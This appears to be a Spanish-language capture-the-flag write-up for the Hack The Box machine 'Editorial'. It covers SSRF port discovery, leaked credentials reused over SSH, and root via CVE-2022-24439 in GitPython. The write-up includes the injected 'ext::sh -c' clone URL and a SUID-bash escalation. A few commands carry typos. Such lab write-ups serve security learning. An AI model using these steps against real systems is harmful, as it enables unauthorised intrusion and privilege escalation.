@@ -1,0 +1,538 @@
+---------------------
+[ EDITORIAL MACHINE ]
+---------------------
+
+# Notas sobre la resolución de la máquina EDITORIAL por FeathersMcgr4w
+
+[GITHUB]: https://github.com/FeathersMcgr4w/
+
+[Lets Start!]
+
+-----
+| 1 | Ejecutamos un ping para verificar si esta activa la maquina victima --> ping -c 1 10.10.11.20
+-----
+        -> ping -c 1 10.10.11.20 -R  (Trace Route)
+
+        [*] ttl: 63 (Linux) => Linux (ttl=64) | Windows (ttl=128)
+
+
+
+
+-----
+| 2 | Escaneo rápido de Puertos con NMAP
+-----
+
+└─$ nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.11.20 -oG allPorts
+
+Puertos Abiertos:
+
+        [*] Open ports: 22, 80
+
+
+
+
+-----
+| 3 | Obtener información detallada con NMAP:
+-----
+
+(scripts de reconocimiento y exportar en formato nmap)
+
+locate .nse | xargs grep "categories" | grep -oP '".*?"' | tr -d '"' | sort -u (scripts de reconocimiento)
+
+
+└─# nmap -sCV -p22,80 10.10.11.20 -oN infoPorts
+
+
+        INFO: 
+
+        22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7
+
+        80/tcp open  http    nginx 1.18.0 (Ubuntu)
+
+
+-[*] Buscar versión de Ubuntu
+
+	Googlear: OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 launchpad
+
+	url: https://launchpad.net/ubuntu/+source/openssh/1:8.9p1-3ubuntu0.7
+
+	data: openssh (1:8.9p1-3ubuntu0.7) jammy; <-- * TARGET * -->
+
+	- - - - - - - 
+
+	Googlear: launchpad nginx 1.18.0
+
+	url: https://launchpad.net/ubuntu/+source/nginx/1.18.0-0ubuntu1.4
+
+	data: nginx (1.18.0-0ubuntu1.4) focal-security; <-- * TARGET * -->
+
+	- - - - - - -
+
+	NOTA: si no usan la misma distro de ubuntu, es por que tal ves haya doquerización con otro SO.
+
+
+
+-----
+| 4 | Realizamos un curl solo cabezeras
+-----
+
+└─$ curl -sX GET "http://10.10.11.20" -I
+
+HTTP/1.1 301 Moved Permanently
+Server: nginx/1.18.0 (Ubuntu)
+Date: Mon, 28 Oct 2024 14:52:22 GMT
+Content-Type: text/html
+Content-Length: 178
+Connection: keep-alive
+Location: http://editorial.htb
+
+
+
+
+-----
+| 5 | WHATWEB
+-----
+
+└─$ whatweb 10.10.11.20
+
+http://10.10.11.20 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.20], RedirectLocation[http://editorial.htb], Title[301 Moved Permanently], nginx[1.18.0]                                                                                                                                                                   
+ERROR Opening: http://editorial.htb - no address for editorial.htb
+
+
+
+-----
+| 6 | Aplicamos Virtual Hosting
+-----
+
+nano /etc/hosts
+
+10.10.11.20 editorial.htb
+
+Le indicamos a nuestra maquina que resuelva el nombre de dominio con la dirección IP especificada.
+
+
+
+-----
+| 7 | Utilizamos BurpSuite
+-----
+
+Pasamos todo el trafico por Foxy Proxy en la config -> ** BurpSuite **
+
+
+(1) Server Side Request Forgery (SSRF)
+
+	Probamos de ejecutar un (SSRF) con el objetivo de listar puertos internos disponibles del servidor
+
+	[IMAGEN] -> Editorial_machine/screenShots/call-SSRF.png
+
+	Por ejemplo, probamos si funciona este puerto  http://127.0.0.1:80 (por puerto 80 web que esta ejecutando)
+
+		[BURPSUITE]: (Interceptar | Ctrol+r | turnOff-Interceptar | send )
+
+	[IMAGEN] -> Editorial_machine/screenShots/burpsuit-repeater.png
+
+	Con este puerto obtenemos una img, pero no nos sirve.
+
+	Necesitamos automatizar el proceso. Lo ideal es escanear del puerto 1 - 65535, pero Burpsuite free esta limitado.
+	Para esto vamos a ver una solución más adelante.
+
+
+
+
+(2) Automatizamos las consultas con (Burpsuite Intruder)
+
+
+	[SOLUCIÓN]: Este problema lo podemos solucionar con el siguiente repo
+
+		-> https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Infrastructure/common-http-ports.txt
+
+			(El repo nos lista una serie de puertos http más utilizados)
+	
+			[66,80,81,443,445,457,1080,1100,1241,1352,1433,1434,1521,1944,2301,3000,3128,3306,4000,4001,4002,4100,5000,5432,5800,5801,5802,6346,6347,7001,7002,8000,8080,8443,8888,30821]
+
+	[BURPSUIT]: 
+
+		Ctrol+i (habilitar burpsuite intruder sobre la petición capturada)
+
+		Configuramos la lista de puertos del repo github
+
+			[IMAGEN] -> Editorial_machine/screenShots/burpsuit-intruder-1.png
+
+
+		Setteamos que exponga todas las salidas de las peticiones a los puertos /images/
+
+			[IMAGEN] -> Editorial_machine/screenShots/burpsuit-intruder-2.png
+
+
+		Resultados
+
+			[IMAGEN] -> Editorial_machine/screenShots/burpsuit-intruder-result-2.png
+
+			Con esto obtenemos que el puerto "5000" es el único que no devuelve una imagen. Este contiene otro servicio.
+			si vemos el response. obtenemos un recurso del servidor. 
+
+
+
+(3) Ejecutamos una petición desde el navegador al recurso proporcionado:
+
+	http://editorial.htb/static/uploads/86fccc77-b91a-4227-ac81-44133913ee77 (ejecutarlo rápido)
+
+	Esto nos descarga un fichero con una respuesta de rutas de API interna del servidor.
+
+	[CONSOLA]
+	
+	└─$ cat 67cf1e20-d61d-49f7-9fda-88bffe3eef78 | jq
+{
+  "messages": [
+    {
+      "promotions": {
+        "description": "Retrieve a list of all the promotions in our library.",
+        "endpoint": "/api/latest/metadata/messages/promos",
+        "methods": "GET"
+      }
+    },
+    {
+      "coupons": {
+        "description": "Retrieve the list of coupons to use in our library.",
+        "endpoint": "/api/latest/metadata/messages/coupons",
+        "methods": "GET"
+      }
+    },
+    {
+      "new_authors": {
+        "description": "Retrieve the welcome message sended to our new authors.",
+        "endpoint": "/api/latest/metadata/messages/authors",
+        "methods": "GET"
+      }
+    },
+    {
+      "platform_use": {
+        "description": "Retrieve examples of how to use the platform.",
+        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
+        "methods": "GET"
+      }
+    }
+  ],
+  "version": [
+    {
+      "changelog": {
+        "description": "Retrieve a list of all the versions and updates of the api.",
+        "endpoint": "/api/latest/metadata/changelog",
+        "methods": "GET"
+      }
+    },
+    {
+      "latest": {
+        "description": "Retrieve the last version of api.",
+        "endpoint": "/api/latest/metadata",
+        "methods": "GET"
+      }
+    }
+  ]
+}
+
+
+
+-----
+| 8 | Consultar a la API
+-----
+
+-[*] Consultamos desde Burpsuite
+
+	http://127.0.0.1:5000/api/latest/metadata/messages/authors (send button)
+
+	[RESPONSE]: static/uploads/aedb4cea-1ddf-4549-860b-61c91f9a2e74
+
+	[NAVIGATOR]: http://editorial.htb/static/uploads/aedb4cea-1ddf-4549-860b-61c91f9a2e74 (esto lo podemos leer con un curl)
+
+	[JSON]: Nos descarga un fichero con data json:
+
+	{
+  "template_mail_message": "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."                                                             
+}
+
+	[DATO]: Estas credenciales las utilizaremos para el servicio "ssh"
+
+		user: dev
+		password: dev080217_devAPI!@
+
+
+
+-----
+| 9 | SSH intrusion and Capture Flag
+-----
+
+	ssh dev@10.10.11.20
+	password: dev080217_devAPI!@
+
+
+-[*] Capturar Flag
+
+	dev@editorial:~$ ls -l
+	total 8
+	drwxrwxr-x 3 dev  dev 4096 Jun  5 14:36 apps
+	-rw-r----- 1 root dev   33 Oct 29 14:02 user.txt
+
+	dev@editorial:~$ cat user.txt
+	9d66305ddef6fdadb2bf4deadc0b8d4d
+
+
+
+------
+| 10 | Verificar maqquina
+------
+
+dev@editorial:~/apps/.git$ lsb_release -a
+No LSB modules are available.
+Distributor ID: Ubuntu
+Description:    Ubuntu 22.04.4 LTS
+Release:        22.04
+Codename:       jammy  <-- * TARGET * ---> 
+
+
+-[*] Verificar usuarios del sistema
+
+	dev@editorial:~/apps$ ls -l /home/
+	total 8
+	drwxr-x--- 4 dev  dev  4096 Oct 29 15:21 dev
+	drwxr-x--- 5 prod prod 4096 Jun  5 14:36 prod
+
+
+	dev@editorial:~/apps$ cat /etc/passwd | grep "bash$"
+	root:x:0:0:root:/root:/bin/bash
+	prod:x:1000:1000:Alirio Acosta:/home/prod:/bin/bash
+	dev:x:1001:1001::/home/dev:/bin/bash
+
+	(Hay 3 usuarios)
+	
+
+
+-[*] Verificamos privilegios "sudo"
+
+	dev@editorial:~/apps/.git$ sudo -l
+	[sudo] password for dev: 
+	Sorry, user dev may not run sudo on editorial.
+
+	No tenemos privilegios 'sudo' :(
+
+
+
+-[*] Buscar archivos con permisos de SUID
+
+	dev@editorial:~/apps/.git$ find / -perm -4000 2>/dev/null
+	/usr/lib/openssh/ssh-keysign
+	/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+	/usr/libexec/polkit-agent-helper-1
+	/usr/bin/chsh
+	/usr/bin/fusermount3
+	/usr/bin/sudo
+	/usr/bin/umount
+	/usr/bin/mount
+	/usr/bin/newgrp
+	/usr/bin/gpasswd
+	/usr/bin/passwd
+	/usr/bin/chfn
+	/usr/bin/su
+
+	No hay nada :(
+
+
+
+-[*] Buscar capabilities del sistema
+
+	dev@editorial:~/apps/.git$ getcap -r / 2>/dev/null
+	/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
+	/usr/bin/mtr-packet cap_net_raw=ep
+	/usr/bin/ping cap_net_raw=ep
+
+	No hay nada :(
+
+
+
+------
+| 11 | Analizar carpeta Git
+------
+
+-[*] Ejecutar git status sobre directorio /apps	
+
+
+	dev@editorial:~/apps$ git status
+
+		- Nos muestra archivos borrados del aplicativo
+
+
+	dev@editorial:~/apps$ git log (ver historial de commits)
+
+
+	dev@editorial:~/apps$ git log --oneline
+	8ad0f31 (HEAD -> master) fix: bugfix in api port endpoint
+	dfef9f2 change: remove debug and update api port
+	b73481b change(api): downgrading prod to dev
+	1e84a03 feat: create api to editorial info
+	3251ec9 feat: create editorial app
+
+
+	dev@editorial:~/apps$ git log -p b73481b (ver información del log especifico)
+
+	Credenciales de usuario prod -> Username: prod\nPassword: 080217_Producti0n_2023!@
+
+	Crendenciales de usuario dev -> Username: dev\nPassword: dev080217_devAPI!@
+
+
+
+------
+| 12 | Acceder SSH a usuario prod
+------
+
+	Username: prod\nPassword: 080217_Producti0n_2023!@
+
+	dev@editorial:~/apps$ su prod
+
+	password: 080217_Producti0n_2023!@
+
+
+
+------
+| 13 | Checkeo de permisos sudo -l
+------
+
+	prod@editorial:~$ sudo -l
+	[sudo] password for prod: 
+	Matching Defaults entries for prod on editorial:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+	User prod may run the following commands on editorial:
+    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py * <-- * TARGET * --> 
+
+
+	prod@editorial:~$ ls -l /opt/internal_apps/clone_changes/clone_prod_change.py
+	-rwxr-x--- 1 root prod 256 Jun  4 11:30 /opt/internal_apps/clone_changes/clone_prod_change.py
+
+	(Fue creado por root, pero prod lo puede leer y ejecutar)
+
+
+
+------
+| 14 | from git import Repo Vulnerability
+------
+
+prod@editorial:~$ cat /opt/internal_apps/clone_changes/clone_prod_change.py
+#!/usr/bin/python3
+
+import os
+import sys
+from git import Repo <-- * TARGET * --> 
+
+os.chdir('/opt/internal_apps/clone_changes')
+
+url_to_clone = sys.argv[1]
+
+r = Repo.init('', bare=True)
+r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
+
+
+
+Acción del script: 
+
+	This line shows that the script utilizes the GitPython library to perform Git operations, specifically
+	for cloning a Git repository using a URL passed as an argument to the script.
+
+	A partir de un input de usuario (argumento) clona un repo de Git.
+
+
+
+------
+| 15 | Buscar from git import Repo vulnerability
+------
+
+Googlear: "from git import Repo vulnerability"
+
+	[RECURSO]: https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858
+
+	[VULNERABILITY]: 
+
+		CVE-2022-24439
+
+		GitPython is a python library used to interact with Git repositories
+
+		Affected versions of this package are vulnerable to Remote Code Execution (RCE) due to improper user input validation, which makes it possible to inject a maliciously 
+		crafted remote URL into the clone command. Exploiting this vulnerability is possible because the library makes external calls to git without sufficient sanitization 
+		of input arguments. This is only relevant when enabling the ext transport protocol.
+
+
+		PoC
+
+		from git import Repo
+		r = Repo.init('', bare=True)
+		r.clone_from('ext::sh -c touch% /tmp/pwned', 'tmp', multi_options=["-c protocol.ext.allow=always"])
+
+
+		 How to fix?
+
+			Upgrade GitPython to version 3.1.30 or higher.
+
+
+	[NOTA]: A traves del argumento del input, podemos ejecutar una ruta maliciosa
+
+	
+
+-[*] Ver librerias de python: pip freeze | grep -i gitpython
+
+	prod@editorial:~$ pip freeze | grep -i gitpython
+
+	GitPython==3.1.29 <-- * VERSION VULNERABLE * --> 
+	^^^^^^^^^^^^^^^^^
+
+
+
+------
+| 16 | Explotación CVE-2022-24439
+------
+
+	Ejecutamos un comando con privilegios de root, para obtener una shell root
+
+
+	(1) Creamos un fichero donde asignamos permiso SUID a la /bin/bash
+
+		nano privsec
+
+			!#/bin/bash
+			chmod u+s /bin/bash
+
+
+	(2) Dar permisos de ejecución
+
+		chmod 777 privesc
+
+
+	(3) Ejecutamos el script pasandolo como argumento al script de python
+
+		prod@editorial:/tmp$ sudo python3 /opt/internal_apps/clone_changes/clone_prod_change.py "ext::sh -c /tmp/privesc"
+
+
+		Verificar permiso asignado:
+		
+		prod@editorial:/tmp$ ls -l /bin/bash 
+		-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash <-- PERMISO SUID --> 
+
+
+	(4) Pedimos una bash con privilegios
+
+		prod@editorial:/tmp$ bash -p
+
+
+	
+------
+| 17 | Root Flag
+------
+
+bash-5.1# whoami
+root
+
+bash-5.1# cd /root/
+
+bash-5.1# ls -l
+total 4
+-rw-r----- 1 root root 33 Oct 29 14:02 root.txt
+bash-5.1# cat root.txt
+813c82b5a08acf89d91358bcad65c370
